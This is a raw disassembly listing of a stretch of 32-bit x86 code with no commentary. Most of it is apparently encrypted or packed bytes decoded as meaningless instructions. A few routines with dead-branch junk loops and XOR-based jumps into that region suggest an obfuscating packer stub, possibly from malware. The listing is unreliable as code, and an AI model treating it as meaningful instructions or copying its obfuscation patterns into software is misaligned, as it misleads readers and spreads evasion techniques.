  4028d7:	fidiv  WORD PTR [edi+0x5f]
  4028da:	xor    eax,0xa19f9ac5
  4028df:	xchg   ecx,eax
  4028e0:	shr    edx,1
  4028e2:	ss mov eax,0xa614c068
  4028e8:	ret    
  4028e9:	mov    ?,WORD PTR [ebx+0x787b4c5d]
  4028ef:	adc    eax,0xae9cc12c
  4028f4:	and    DWORD PTR [edi-0x58],ebx
  4028f7:	bound  ebx,QWORD PTR [edx]
  4028f9:	div    eax
  4028fb:	jns    0x40291f
  4028fd:	fwait
  4028fe:	mov    esi,DWORD PTR [esi-0x266c824c]
  402904:	iret   
  402905:	jb     0x40292c
  402907:	jns    0x4028e4
  402909:	or     al,BYTE PTR [ebp+ebp*2+0x1b4ad6ef]
  402910:	pop    eax
  402911:	cwde   
  402912:	cmp    ah,al
  402914:	inc    ebx
  402915:	into   
  402916:	or     DWORD PTR [eax+0x9],esi
  402919:	inc    esi
  40291a:	div    DWORD PTR [ebp+0x2d]
  40291d:	call   0x341a64f0
  402922:	or     dl,al
  402924:	daa    
  402925:	lods   eax,DWORD PTR ds:[esi]
  402926:	fwait
  402927:	popa   
  402928:	in     al,dx
  402929:	lahf   
  40292a:	cmp    eax,0xe2be927a
  40292f:	push   ebp
  402930:	sar    DWORD PTR [ebp+0x32],0xb1
  402934:	pop    esp
  402935:	rcr    BYTE PTR [edx-0x25],0xc
  402939:	outs   dx,DWORD PTR ds:[esi]
  40293a:	movdqa xmm5,XMMWORD PTR [edx]
  40293e:	aas    
  40293f:	pop    ds
  402940:	in     eax,0x1f
  402942:	and    DWORD PTR [ecx-0x258a60f0],ebx
  402948:	or     ebx,DWORD PTR [ebx+0x29b871d7]
  40294e:	jo     0x402929
  402950:	inc    ecx
  402951:	inc    ecx
  402952:	gs test al,0xf9
  402955:	out    0x15,eax
  402957:	fisub  WORD PTR [esp+eax*2+0x57]
  40295b:	xchg   DWORD PTR [edi],edx
  40295d:	jge    0x4029a1
  40295f:	lods   eax,DWORD PTR ds:[esi]
  402960:	test   al,0x3e
  402962:	fwait
  402963:	xor    eax,0x5ed86a6b
  402968:	leave  
  402969:	ret    0x4
  40296c:	push   ebp
  40296d:	mov    ebp,esp
  40296f:	sub    esp,0x28
  402972:	leave  
  402973:	ret    0x10
  402976:	push   ebp
  402977:	mov    ebp,esp
  402979:	push   ecx
  40297a:	or     eax,DWORD PTR ds:0x42fcdd
  402980:	push   ecx
  402981:	movzx  edx,WORD PTR ds:0x42e6ef
  402988:	sbb    DWORD PTR ds:0x42e713,edx
  40298e:	mov    eax,0xf89c8531
  402993:	mov    DWORD PTR ds:0x42fce9,0x1a
  40299d:	cmp    DWORD PTR ds:0x42fce9,0x0
  4029a4:	je     0x402a39
  4029aa:	cmp    DWORD PTR ds:0x42fce9,0x24
  4029b1:	jne    0x4029cc
  4029b7:	push   0x42e12c
  4029bc:	push   0x42e703
  4029c1:	push   0x59d6
  4029c6:	call   DWORD PTR ds:0x42e44f
  4029cc:	mov    edx,DWORD PTR ds:0x42fce9
  4029d2:	dec    edx
  4029d3:	mov    DWORD PTR ds:0x42fce9,edx
  4029d9:	jmp    0x40299d
  4029de:	mov    DWORD PTR ds:0x42e6ff,0x19
  4029e8:	cmp    DWORD PTR ds:0x42e6ff,0x0
  4029ef:	je     0x402a39
  4029f5:	cmp    DWORD PTR ds:0x42e6ff,0x4
  4029fc:	jne    0x402a0d
  402a02:	push   0x5bc5
  402a07:	call   DWORD PTR ds:0x42e2d3
  402a0d:	cmp    DWORD PTR ds:0x42e6ff,0x5
  402a14:	jne    0x402a27
  402a1a:	mov    edx,DWORD PTR ds:0x42e6ff
  402a20:	dec    edx
  402a21:	mov    DWORD PTR ds:0x42e6ff,edx
  402a27:	mov    edx,DWORD PTR ds:0x42e6ff
  402a2d:	dec    edx
  402a2e:	mov    DWORD PTR ds:0x42e6ff,edx
  402a34:	jmp    0x4029e8
  402a39:	mov    DWORD PTR [ebp-0x8],eax
  402a3c:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  402a43:	mov    edx,DWORD PTR [ebp-0x8]
  402a46:	mov    ecx,DWORD PTR ds:0x42fdae
  402a4c:	mov    ecx,DWORD PTR [ecx]
  402a4e:	xor    DWORD PTR ds:0x42fcd5,ecx
  402a54:	push   esi
  402a55:	mov    ecx,0x7510855
  402a5a:	or     DWORD PTR ds:0x42fd0d,ebx
  402a60:	xor    edx,ecx
  402a62:	sbb    esi,0x5361
  402a68:	mov    esi,0x32729c
  402a6d:	sbb    DWORD PTR ds:0x42e128,0x657d
  402a77:	push   edi
  402a78:	and    DWORD PTR ds:0x42e128,0x0
  402a82:	jmp    0x402a94
  402a87:	mov    edi,DWORD PTR ds:0x42e128
  402a8d:	inc    edi
  402a8e:	mov    DWORD PTR ds:0x42e128,edi
  402a94:	cmp    DWORD PTR ds:0x42e128,0x10
  402a9b:	jae    0x402abe
  402aa1:	cmp    DWORD PTR ds:0x42e128,0x11
  402aa8:	jne    0x402ab9
  402aae:	push   0x42e141
  402ab3:	call   DWORD PTR ds:0x42e453
  402ab9:	jmp    0x402a87
  402abe:	mov    edi,DWORD PTR [ebp+0x10]
  402ac1:	add    edx,esi
  402ac3:	cmp    edi,edx
  402ac5:	je     0x4036ba
  402acb:	mov    edx,DWORD PTR [ebp-0x8]
  402ace:	mov    eax,DWORD PTR [ebp-0x4]
  402ad1:	xor    eax,ecx
  402ad3:	mov    edi,0xffcd8d64
  402ad8:	sub    edi,eax
  402ada:	add    edi,DWORD PTR [ebp+0x10]
  402add:	xor    edx,ecx
  402adf:	jmp    0x402dbe
  402ae4:	imul   ebx,DWORD PTR [edx],0xffffff8f
  402ae7:	cmp    BYTE PTR [ebp+0x71],cl
  402aea:	jae    0x402a9d
  402aec:	jl     0x402b40
  402aee:	dec    esi
  402aef:	mov    esp,0xd2f6cca
  402af4:	jo     0x402b02
  402af6:	jo     0x402b68
  402af8:	mov    esi,0x570707e
  402afd:	mov    bh,0x20
  402aff:	xchg   DWORD PTR [edi-0x53],edi
  402b02:	test   eax,0x4891b302
  402b07:	shl    DWORD PTR [esi],0xeb
  402b0a:	mov    esi,0xf3605ab9
  402b0f:	cs and eax,edx
  402b12:	pop    ds
  402b13:	add    dl,BYTE PTR cs:[ecx+0x483518c3]
  402b1a:	(bad)  
  402b1b:	jge    0x402add
  402b1d:	aam    0x13
  402b1f:	and    BYTE PTR [ebp-0x39c2ca36],bh
  402b25:	jmp    0x402b7d
  402b27:	int    0x4c
  402b29:	js     0x402b7b
  402b2b:	and    eax,0x148976b9
  402b30:	add    al,bl
  402b32:	xchg   edx,eax
  402b33:	mov    al,ds:0x9938a214
  402b38:	or     al,0x57
  402b3a:	push   edi
  402b3b:	adc    edi,edx
  402b3d:	mov    ch,0xcd
  402b3f:	jbe    0x402b85
  402b41:	mov    al,ds:0x4a06ea0f
  402b46:	sbb    cl,BYTE PTR [edi-0x7f57fce2]
  402b4c:	jmp    0x78e8:0x781da497
  402b53:	cmp    esp,DWORD PTR [eax+esi*8-0x2d0cc794]
  402b5a:	(bad)  
  402b5b:	out    0x85,eax
  402b5d:	loopne 0x402bb0
  402b5f:	inc    ebx
  402b60:	aas    
  402b61:	ss push eax
  402b63:	inc    eax
  402b64:	popa   
  402b65:	and    cl,BYTE PTR ds:0x1f7afffa
  402b6b:	inc    edx
  402b6c:	pop    esp
  402b6d:	push   ebx
  402b6e:	adc    ch,BYTE PTR [edi+edi*2]
  402b71:	pop    ebx
  402b72:	push   0xf4bd146b
  402b77:	cmp    DWORD PTR ds:0xd1f20580,edi
  402b7d:	outs   dx,DWORD PTR ds:[esi]
  402b7e:	add    al,0xf6
  402b80:	add    DWORD PTR [ebp-0x7],esp
  402b83:	cmp    eax,0xa0dac6d4
  402b88:	sub    ebx,DWORD PTR [edi+0x45f13084]
  402b8e:	adc    dh,bl
  402b90:	test   al,0x5d
  402b92:	adc    al,0xa
  402b94:	adc    al,BYTE PTR [eax+esi*2]
  402b97:	adc    ah,ch
  402b99:	aad    0x77
  402b9b:	xor    BYTE PTR [edi],bl
  402b9d:	pop    edx
  402b9e:	push   ebx
  402b9f:	push   cs
  402ba0:	sbb    al,BYTE PTR [eax-0x36e97349]
  402ba6:	adc    eax,0xad89471
  402bab:	sbb    dl,BYTE PTR [eax]
  402bad:	fwait
  402bae:	push   edi
  402baf:	xchg   edi,eax
  402bb0:	mov    ds:0x576b58af,eax
  402bb5:	in     eax,0x23
  402bb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bb8:	nop
  402bb9:	fistp  DWORD PTR [ebp+0x4bc3bdab]
  402bbf:	pop    edx
  402bc0:	int3   
  402bc1:	cmp    edi,DWORD PTR [ebp-0x50d589dc]
  402bc7:	xchg   esi,eax
  402bc8:	add    ecx,DWORD PTR [edi]
  402bca:	dec    esp
  402bcb:	push   ds
  402bcc:	inc    ebx
  402bcd:	cmc    
  402bce:	inc    edi
  402bcf:	add    dh,dh
  402bd1:	in     eax,0xed
  402bd3:	mov    edx,ecx
  402bd5:	fild   WORD PTR [ebp-0x79]
  402bd8:	xor    DWORD PTR [eax-0x3ba4c36c],eax
  402bde:	ror    cl,1
  402be0:	into   
  402be1:	pop    edx
  402be2:	xchg   ecx,eax
  402be3:	loopne 0x402bef
  402be5:	int    0xca
  402be7:	fwait
  402be8:	mov    dl,0xf6
  402bea:	jge    0x402bc3
  402bec:	out    dx,al
  402bed:	push   edx
  402bee:	dec    esp
  402bef:	and    eax,0x6c348e48
  402bf4:	jmp    0x402bf2
  402bf6:	loope  0x402c35
  402bf8:	jmp    0xfe57c33f
  402bfd:	inc    ebx
  402bfe:	pop    edi
  402bff:	add    eax,0xa5171f4f
  402c04:	xchg   ebp,eax
  402c05:	jl     0x402c6e
  402c07:	xchg   esi,eax
  402c08:	ss punpckhdq mm5,mm2
  402c0c:	loope  0x402be3
  402c0e:	sbb    eax,edi
  402c10:	sbb    eax,0x592e6a9d
  402c15:	push   0x2f
  402c17:	adc    eax,0xefa9822f
  402c1c:	mov    BYTE PTR [esi+0x2fbf788],bh
  402c22:	cmp    edi,DWORD PTR [ebp-0x2b]
  402c25:	sbb    BYTE PTR [ecx-0x568a7c9],al
  402c2b:	inc    ebp
  402c2c:	scas   eax,DWORD PTR es:[edi]
  402c2d:	dec    edx
  402c2e:	mov    ah,0x58
  402c30:	pop    es
  402c31:	lods   al,BYTE PTR ds:[esi]
  402c32:	add    DWORD PTR [edi],ecx
  402c34:	add    esp,DWORD PTR [ecx]
  402c36:	dec    edx
  402c37:	sub    di,WORD PTR [eax+0x58781a1e]
  402c3e:	sbb    dh,dh
  402c40:	mov    bl,0xac
  402c42:	(bad)  
  402c43:	call   0xa07b:0xd01ec7
  402c4a:	aad    0x94
  402c4c:	ins    BYTE PTR es:[edi],dx
  402c4d:	jg     0x402c58
  402c4f:	fdivr  QWORD PTR [esi]
  402c51:	repz test DWORD PTR [ecx],edx
  402c54:	xchg   ebx,eax
  402c55:	imul   ecx,DWORD PTR [edx],0xffffffd5
  402c58:	test   eax,0x88d65460
  402c5d:	or     BYTE PTR [eax],0x55
  402c60:	cwde   
  402c61:	test   al,0x39
  402c63:	dec    ebx
  402c64:	(bad)  
  402c65:	and    DWORD PTR ds:0xf43a8965,ecx
  402c6b:	cwde   
  402c6c:	push   ss
  402c6d:	outs   dx,DWORD PTR ds:[esi]
  402c6e:	rcr    BYTE PTR [esi-0x1d5e9f5e],cl
  402c74:	or     al,0x1c
  402c76:	repz inc edx
  402c78:	ret    0xcd6f
  402c7b:	adc    ecx,0x3c484127
  402c81:	push   esi
  402c82:	loop   0x402c95
  402c84:	jnp    0x402cbe
  402c86:	iret   
  402c87:	js     0x402c5b
  402c89:	mov    esp,gs
  402c8b:	mov    edi,0x474dec33
  402c90:	add    cl,BYTE PTR [ecx]
  402c92:	inc    esp
  402c93:	pop    ebx
  402c94:	and    WORD PTR [ebp+0x3e2b6b6],cx
  402c9b:	test   ebx,eax
  402c9d:	xchg   esp,eax
  402c9e:	xor    ch,ch
  402ca0:	mov    eax,ds:0xaa79e1b
  402ca5:	lds    esi,FWORD PTR [edi-0x59]
  402ca8:	arpl   WORD PTR [edx-0x4d],dx
  402cab:	test   al,0xb3
  402cad:	mov    ah,0xd8
  402caf:	lea    eax,[eax-0x16]
  402cb2:	and    eax,0xdf4c89c4
  402cb7:	fimul  WORD PTR [edx-0x737ce5cc]
  402cbd:	ret    0xf86e
  402cc0:	cmp    BYTE PTR [edi+0x10],ah
  402cc3:	jecxz  0x402cc4
  402cc5:	lea    edx,[edx-0x7b]
  402cc8:	add    bh,BYTE PTR [esi-0x18]
  402ccb:	xor    al,0xd1
  402ccd:	jp     0x402cd5
  402ccf:	mov    ah,0x85
  402cd1:	cmp    DWORD PTR [esi-0x34],ebp
  402cd4:	mov    WORD PTR [edi+0x8],gs
  402cd7:	sbb    BYTE PTR [eax+0x2d206213],0x80
  402cde:	or     cl,bl
  402ce0:	scas   al,BYTE PTR es:[edi]
  402ce1:	fwait
  402ce2:	add    BYTE PTR [edi+0xe70a078],dl
  402ce8:	repnz cmp al,BYTE PTR [ecx]
  402ceb:	xor    ebx,DWORD PTR [edi+ebp*1-0x40]
  402cef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402cf0:	mov    ds:0xd11206cc,al
  402cf5:	jle    0x402d51
  402cf7:	inc    ecx
  402cf8:	in     eax,dx
  402cf9:	gs add al,0x95
  402cfc:	arpl   WORD PTR [ebx+0x5a],dx
  402cff:	outs   dx,BYTE PTR ds:[esi]
  402d00:	cdq    
  402d01:	pop    ss
  402d02:	xlat   BYTE PTR ds:[ebx]
  402d03:	jne    0x402d6a
  402d05:	repnz mov cl,0x77
  402d08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d09:	loop   0x402d00
  402d0b:	xor    DWORD PTR ds:0xabc9852e,esi
  402d11:	outs   dx,BYTE PTR ds:[esi]
  402d12:	or     BYTE PTR [eax+0x15a1754d],ah
  402d18:	mov    DWORD PTR [ebx-0x16a9d5a3],ecx
  402d1e:	fdivr  DWORD PTR [ecx+edi*8+0x3a]
  402d22:	mov    eax,ds:0x5063e249
  402d27:	dec    edx
  402d28:	mov    ah,0xd
  402d2a:	retf   
  402d2b:	xor    edx,DWORD PTR [esi+ebx*4-0x41]
  402d2f:	xchg   ecx,edx
  402d31:	mov    eax,0x48ffc783
  402d36:	add    dl,BYTE PTR [ebx-0x7ec64383]
  402d3c:	shr    dl,0xa8
  402d3f:	dec    ebp
  402d40:	div    DWORD PTR [ebp+0x68425777]
  402d46:	pop    edi
  402d47:	jmp    0x402dad
  402d49:	adc    DWORD PTR [esi],ecx
  402d4b:	adc    DWORD PTR [eax],0x22
  402d4e:	fidivr DWORD PTR [ebp-0x38]
  402d51:	sahf   
  402d52:	in     al,dx
  402d53:	retf   
  402d54:	cmp    DWORD PTR [edi],ebx
  402d56:	cli    
  402d57:	jl     0x402cf6
  402d59:	ss mov eax,0x96af7d2
  402d5f:	pusha  
  402d60:	(bad)  
  402d61:	repnz pop esp
  402d63:	outs   dx,BYTE PTR ds:[esi]
  402d64:	rol    esi,0xba
  402d67:	loope  0x402d07
  402d69:	sub    al,0xac
  402d6b:	aad    0x45
  402d6d:	das    
  402d6e:	push   ds
  402d6f:	loop   0x402d02
  402d71:	cmp    DWORD PTR [edi],edx
  402d73:	push   DWORD PTR [edx+0x54]
  402d76:	adc    BYTE PTR [ecx],0xcd
  402d79:	sub    BYTE PTR ds:0x653bb117,ch
  402d7f:	mov    al,ds:0x223d9e0c
  402d84:	loopne 0x402d77
  402d86:	nop
  402d87:	clc    
  402d88:	mov    ebp,0xf2ad20e6
  402d8d:	fwait
  402d8e:	lods   al,BYTE PTR ds:[esi]
  402d8f:	(bad)  
  402d90:	lds    ebx,FWORD PTR ds:[edi-0x795aaddf]
  402d97:	lahf   
  402d98:	pop    edi
  402d99:	inc    edx
  402d9a:	mov    ah,0x7b
  402d9c:	cmp    BYTE PTR [eax-0x96d7231],bl
  402da2:	pop    edx
  402da3:	push   esp
  402da4:	sub    esi,DWORD PTR [esi-0x4db9445c]
  402daa:	cmc    
  402dab:	jge    0x402d8a
  402dad:	lods   al,BYTE PTR ds:[esi]
  402dae:	rol    dl,1
  402db0:	dec    esp
  402db1:	pop    esi
  402db2:	dec    eax
  402db3:	cs fs stos DWORD PTR es:[edi],eax
  402db6:	icebp  
  402db7:	mov    cl,0xe5
  402db9:	dec    edi
  402dba:	pop    ds
  402dbb:	add    DWORD PTR [ebx+0x3bd6036f],0xffffffd7
  402dc2:	ja     0x4036b5
  402dc8:	push   ebx
  402dc9:	jmp    0x4030b2
  402dce:	jmp    0x4030ad
  402dd3:	mov    ecx,0xe1afe4fc
  402dd8:	ja     0x402e2b
  402dda:	push   0xffffffa6
  402ddc:	aas    
  402ddd:	xchg   ebp,eax
  402dde:	out    dx,eax
  402ddf:	mov    edi,0xbecfb1ab
  402de4:	or     dh,BYTE PTR [eax+0x70]
  402de7:	mov    esi,0x5d70707e
  402dec:	xor    BYTE PTR [edx],cl
  402dee:	je     0x402e14
  402df0:	addr16 sbb al,0x35
  402df3:	jg     0x402df2
  402df5:	pop    ds
  402df6:	push   ss
  402df7:	adc    DWORD PTR [esi+0x18],esi
  402dfa:	jl     0x402e03
  402dfc:	cmp    edi,DWORD PTR ds:0xba4c078b
  402e02:	icebp  
  402e03:	test   al,0xbd
  402e05:	push   ss
  402e06:	xchg   ebp,eax
  402e07:	sbb    bh,BYTE PTR [esi+0x1d]
  402e0a:	and    al,0x43
  402e0c:	sbb    DWORD PTR [eax+0x4d],eax
  402e0f:	mov    dl,0x18
  402e11:	xor    eax,0xa8f200be
  402e16:	pop    ebx
  402e17:	mov    esi,gs
  402e19:	cmp    bl,0x62
  402e1c:	loop   0x402dc8
  402e1e:	sar    BYTE PTR ds:0x9ef1e7ea,cl
  402e24:	sahf   
  402e25:	sub    edx,0x8a1b984b
  402e2b:	iret   
  402e2c:	mov    al,ds:0x77b44aec
  402e31:	push   ebp
  402e32:	mov    ch,0x68
  402e34:	int    0x76
  402e36:	sub    ebp,DWORD PTR [ebx+0x54]
  402e39:	ret    0xbf28
  402e3c:	aaa    
  402e3d:	dec    BYTE PTR [eax-0x67]
  402e40:	adc    DWORD PTR [esi+0x1f],ebp
  402e43:	outs   dx,DWORD PTR ds:[esi]
  402e44:	mov    bh,0xb1
  402e46:	jb     0x402e72
  402e48:	adc    DWORD PTR [ecx-0x78203cb1],edi
  402e4e:	mov    ebx,0xdf96c26
  402e53:	fsubp  st(3),st
  402e55:	aad    0xef
  402e57:	or     ah,BYTE PTR [edx+ebp*4-0x23]
  402e5b:	pop    es
  402e5c:	cmc    
  402e5d:	in     eax,dx
  402e5e:	(bad)  
  402e5f:	push   ebp
  402e61:	repnz dec ecx
  402e63:	jns    0x402eb9
  402e65:	stc    
  402e66:	aad    0xa3
  402e68:	out    0x23,al
  402e6a:	mov    ah,0x24
  402e6c:	jg     0x402e74
  402e6e:	test   eax,0x7411b0fd
  402e73:	aas    
  402e74:	sbb    eax,0xf46bf47
  402e79:	lock cld 
  402e7b:	or     al,0x4
  402e7d:	fdivr  QWORD PTR [esp+ebp*1-0x720867a9]
  402e84:	dec    edx
  402e85:	mov    al,ds:0x36fde5c7
  402e8a:	xchg   ecx,eax
  402e8b:	jo     0x402e2a
  402e8d:	gs push esp
  402e8f:	push   ds
  402e90:	mov    ah,0xe3
  402e92:	jle    0x402e9f
  402e94:	test   DWORD PTR [esi-0x3470df1d],esp
  402e9a:	loopne 0x402e48
  402e9c:	fsubp  st(4),st
  402e9e:	(bad)  
  402e9f:	cdq    
  402ea0:	dec    ebx
  402ea1:	push   eax
  402ea2:	xlat   BYTE PTR ds:[ebx]
  402ea3:	sbb    eax,0xffb10f3d
  402ea8:	sub    BYTE PTR [ecx-0x7f],al
  402eab:	add    DWORD PTR [esi+0x78],ebx
  402eae:	retf   0xd8b5
  402eb1:	jbe    0x402f19
  402eb3:	cmp    esi,DWORD PTR [ebx+0x12a77078]
  402eb9:	cdq    
  402eba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ebb:	adc    DWORD PTR [ebp+0x73e71e97],0x57
  402ec2:	xor    ah,BYTE PTR [edi-0x36cba777]
  402ec8:	lds    ebx,FWORD PTR [esi-0x28]
  402ecb:	(bad)  
  402ecc:	mov    eax,0x24dbd460
  402ed1:	dec    ebp
  402ed2:	push   ebp
  402ed4:	jno    0x402ebc
  402ed6:	iret   
  402ed7:	add    al,0x5a
  402ed9:	or     al,0x33
  402edb:	xchg   ebx,eax
  402edc:	adc    ah,dl
  402ede:	mov    esp,DWORD PTR [edi]
  402ee0:	jmp    0x3d7ba2f9
  402ee5:	mov    WORD PTR [edi-0x1],fs
  402ee8:	cmc    
  402ee9:	lahf   
  402eea:	or     BYTE PTR ds:0x4394a033,0x7b
  402ef1:	and    eax,0x75025025
  402ef6:	mov    edi,0xe1616386
  402efb:	into   
  402efc:	mov    al,ds:0x4aab1630
  402f01:	xlat   BYTE PTR ds:[ebx]
  402f02:	addr16 stc 
  402f04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f05:	inc    edi
  402f06:	xor    ah,BYTE PTR [edx]
  402f08:	sbb    BYTE PTR ds:0xd7afd484,0x62
  402f0f:	popa   
  402f10:	xor    DWORD PTR [edx+0xc],edx
  402f13:	mov    edi,0x53e5bed7
  402f18:	dec    ebp
  402f19:	sub    al,BYTE PTR [edi+eiz*8-0x12]
  402f1d:	mov    cl,0xa8
  402f1f:	jle    0x402f82
  402f21:	cmp    DWORD PTR [eax-0x54bd2068],edx
  402f27:	push   esi
  402f28:	aam    0x18
  402f2a:	push   ebp
  402f2b:	push   ebx
  402f2c:	jg     0x402edf
  402f2e:	loopne 0x402f23
  402f30:	cli    
  402f31:	sub    al,0xe2
  402f33:	ins    DWORD PTR es:[edi],dx
  402f34:	pop    ds
  402f35:	mov    ch,0xf
  402f37:	push   eax
  402f38:	mov    dl,0xdd
  402f3a:	out    0x78,al
  402f3c:	mov    bh,0x27
  402f3e:	pop    ebp
  402f3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f40:	or     esi,DWORD PTR [ecx-0x57]
  402f43:	push   ds
  402f44:	jo     0x402eec
  402f46:	push   esp
  402f47:	push   ecx
  402f48:	mov    ebp,0xb6eb78c4
  402f4d:	shl    DWORD PTR [eax+0x37],0xf8
  402f51:	push   cs
  402f52:	xchg   ecx,eax
  402f53:	inc    ebp
  402f54:	push   edx
  402f55:	hlt    
  402f56:	inc    edx
  402f57:	xor    DWORD PTR [ebp+0x6c],ecx
  402f5a:	xchg   ecx,eax
  402f5b:	jge    0x402fd9
  402f5d:	nop
  402f5e:	dec    ebx
  402f5f:	fisub  WORD PTR [edx-0x78]
  402f62:	jae    0x402ef0
  402f64:	jle    0x402f71
  402f66:	stos   DWORD PTR es:[edi],eax
  402f67:	and    edi,DWORD PTR [ecx-0x6e]
  402f6a:	or     ebp,DWORD PTR [ecx-0x1094dfc]
  402f70:	cld    
  402f71:	xchg   DWORD PTR [ecx+0x4c],ebp
  402f74:	sub    ebp,edi
  402f76:	cmc    
  402f77:	sahf   
  402f78:	repz fld QWORD PTR [ecx]
  402f7b:	xchg   BYTE PTR [eax-0x55930e33],bl
  402f81:	data16 (bad) 
  402f83:	cmp    esp,edx
  402f85:	popa   
  402f86:	(bad)  
  402f87:	fs and ch,ah
  402f8a:	jg     0x402f13
  402f8c:	fdivp  st(7),st
  402f8e:	scas   al,BYTE PTR es:[edi]
  402f8f:	or     eax,0xc7b92a8f
  402f94:	pop    esi
  402f95:	inc    esp
  402f96:	pop    ss
  402f97:	push   ds
  402f98:	push   ds
  402f99:	ret    0x6e48
  402f9c:	pop    edx
  402f9d:	push   edx
  402f9e:	setg   dl
  402fa1:	mov    esp,0x1174a665
  402fa6:	ja     0x402fdc
  402fa8:	push   esi
  402fa9:	in     eax,0xd9
  402fab:	mov    dl,0x49
  402fad:	aam    0xe
  402faf:	je     0x402f84
  402fb1:	mov    cl,0x2
  402fb3:	icebp  
  402fb4:	ds repz pop edi
  402fb7:	adc    edi,DWORD PTR [ebp-0x30902a1a]
  402fbd:	lods   al,BYTE PTR ds:[esi]
  402fbe:	xlat   BYTE PTR ds:[ebx]
  402fbf:	xchg   ebx,eax
  402fc0:	shl    DWORD PTR [ebp-0x7b],1
  402fc3:	jns    0x403027
  402fc5:	sbb    DWORD PTR [ebx-0x76156155],eax
  402fcb:	inc    ecx
  402fcc:	push   0xffffffb9
  402fce:	js     0x402fc2
  402fd0:	mov    al,0x32
  402fd2:	inc    esi
  402fd3:	push   es
  402fd4:	xor    eax,0xb2565717
  402fd9:	or     ecx,DWORD PTR [ebp+0x22]
  402fdc:	adc    eax,0x3b53f7a1
  402fe1:	daa    
  402fe2:	mov    dh,0xc3
  402fe4:	push   edx
  402fe5:	sbb    ch,BYTE PTR [edi-0x59]
  402fe8:	xchg   esi,ecx
  402fea:	out    0xf1,eax
  402fec:	ins    BYTE PTR es:[edi],dx
  402fed:	mov    eax,ds:0xc3ac02a3
  402ff2:	pop    ecx
  402ff3:	out    dx,eax
  402ff4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ff5:	inc    edi
  402ff6:	clc    
  402ff7:	lea    esi,[esi+0x6e2c50d]
  402ffd:	outs   dx,DWORD PTR ds:[esi]
  402ffe:	cmp    BYTE PTR [esi+0x8],dh
  403001:	pop    esp
  403002:	adc    BYTE PTR [eax-0x7e060c48],dh
  403008:	cs pop ebp
  40300a:	mov    esi,0xc0a70cc7
  40300f:	cld    
  403010:	fsubr  st,st(7)
  403012:	xor    esi,ebp
  403014:	shl    DWORD PTR [esi],0x48
  403017:	dec    ecx
  403018:	pop    ss
  403019:	in     eax,0xb3
  40301b:	adc    esp,ebx
  40301d:	sub    DWORD PTR [eax-0x463cb52a],ebp
  403023:	push   edx
  403024:	and    eax,0xb533862d
  403029:	(bad)  
  40302a:	loopne 0x403015
  40302c:	imul   eax,DWORD PTR [ecx],0x63d6d3e2
  403032:	inc    ebp
  403033:	sbb    ebx,DWORD PTR [ecx]
  403035:	jmp    0x77db9f10
  40303a:	adc    ebx,DWORD PTR [ebp-0x5e]
  40303d:	push   ebx
  40303e:	enter  0x27d1,0xdb
  403042:	adc    DWORD PTR [ebx-0x2509b1b5],edx
  403048:	bound  esi,QWORD PTR [ebx]
  40304a:	loope  0x403007
  40304c:	(bad)  
  40304d:	pop    ebx
  40304e:	mov    WORD PTR [edx+0xd],fs
  403051:	cdq    
  403052:	mov    ch,0x7
  403054:	mov    ebp,0xaafce15
  403059:	ficom  DWORD PTR [ebp-0x5fccc8b4]
  403060:	stos   DWORD PTR es:[edi],eax
  403061:	inc    esp
  403062:	pop    ebp
  403063:	imul   ecx,DWORD PTR [edx-0x7e],0x70
  403067:	xor    WORD PTR [eax],si
  40306a:	stc    
  40306b:	idiv   DWORD PTR [esi-0x73]
  40306e:	sub    DWORD PTR [ecx+ebx*1-0x6e438ca6],edi
  403075:	xor    DWORD PTR [edi+0x4c],0x76947d4f
  40307c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40307d:	or     DWORD PTR [edi],edx
  40307f:	repnz stos DWORD PTR es:[edi],eax
  403081:	aad    0xc6
  403083:	aas    
  403084:	loope  0x40309f
  403086:	mov    ecx,0xac1d721b
  40308b:	loope  0x4030c1
  40308d:	xchg   edi,eax
  40308e:	loope  0x403085
  403090:	icebp  
  403091:	jbe    0x403083
  403093:	jmp    0x2e1e:0x438ca04
  40309a:	mov    ebx,0xc8ca0449
  40309f:	pop    esp
  4030a0:	xchg   BYTE PTR [ebx],ch
  4030a2:	sysenter 
  4030a4:	add    al,0xb9
  4030a6:	inc    edx
  4030a7:	cmp    ch,BYTE PTR [edi]
  4030a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030aa:	mov    cs,WORD PTR [esi]
  4030ac:	sar    DWORD PTR [esi+0x32729c],0x8b
  4030b3:	inc    ebp
  4030b4:	clc    
  4030b5:	mov    edi,DWORD PTR [ebp-0x4]
  4030b8:	xor    edi,ecx
  4030ba:	add    edi,esi
  4030bc:	jmp    0x40339b
  4030c1:	fist   DWORD PTR [ecx+0x4b76cc16]
  4030c7:	loope  0x40307a
  4030c9:	lds    edx,FWORD PTR [esi-0x42]
  4030cc:	add    al,0xaf
  4030ce:	dec    ebp
  4030cf:	int3   
  4030d0:	or     bh,ah
  4030d2:	pop    ss
  4030d3:	jo     0x403145
  4030d5:	mov    esi,0xd670707e
  4030da:	aaa    
  4030db:	jg     0x403104
  4030dd:	out    0xe6,eax
  4030df:	pop    ebx
  4030e0:	cli    
  4030e1:	mov    bl,0xdc
  4030e3:	call   0xcd7dee73
  4030e8:	jge    0x403144
  4030ea:	jae    0x4030f9
  4030ec:	fbstp  TBYTE PTR [edx+0x50]
  4030ef:	xchg   esp,eax
  4030f0:	sub    al,BYTE PTR [edi+0x55cbac02]
  4030f6:	aaa    
  4030f7:	xchg   ebx,eax
  4030f8:	call   0x81b1641d
  4030fd:	mov    ds:0xb0dcbcb3,eax
  403102:	xor    BYTE PTR [ebx],ch
  403104:	mov    WORD PTR [eax-0x24423854],?
  40310a:	stc    
  40310b:	nop
  40310c:	mov    ebp,0xc55447e1
  403111:	test   eax,0xd89f0581
  403116:	xchg   ebp,eax
  403117:	jg     0x403140
  403119:	es lahf 
  40311b:	scas   eax,DWORD PTR es:[edi]
  40311c:	bound  eax,QWORD PTR [edi-0x5c]
  40311f:	mov    esi,0xdc411ec2
  403124:	mov    ds:0x7e1a68cd,eax
